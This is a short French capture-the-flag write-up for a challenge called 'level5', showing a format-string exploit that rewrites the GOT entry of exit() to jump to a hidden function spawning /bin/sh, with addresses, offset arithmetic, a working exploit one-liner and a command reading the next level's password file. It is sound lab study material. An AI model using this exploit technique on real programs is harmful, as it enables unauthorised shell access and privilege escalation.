# level5 - Exploitation de la GOT via Format String

## Analyse du Programme

**Structure**
- Fonction `n()` avec `printf()` vulnérable
- Fonction `o()` avec `system("/bin/sh")` non appelée
- `exit()` appelé après `printf()`

**Adresses Importantes**
- `o()`: `0x080484a4`
- `exit@plt`: `0x80483d0`
- `exit@got.plt`: `0x8049838`

## Stratégie d'Exploitation

**Méthode**
- Réécriture de l'entrée GOT de `exit()`
- Redirection vers la fonction `o()`
- Utilisation de `%hn` pour écrire en deux parties

**Calcul des Offsets**
- Premier write: `0x0804` (2052 - 8 = 2044)
- Second write: `0x84a4` (33956 - 2052 = 31904)

## Exploitation

**Commande d'Exploitation**
```bash
(python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044d" + "%4$hn" + "%31904d" + "%5$hn"'; cat) | ./level5
```

**Obtention du Flag**
```bash
cat /home/user/level6/.pass
```

Cette exploitation redirige l'appel à `exit()` vers la fonction `o()` en modifiant la GOT, permettant l'exécution du shell.
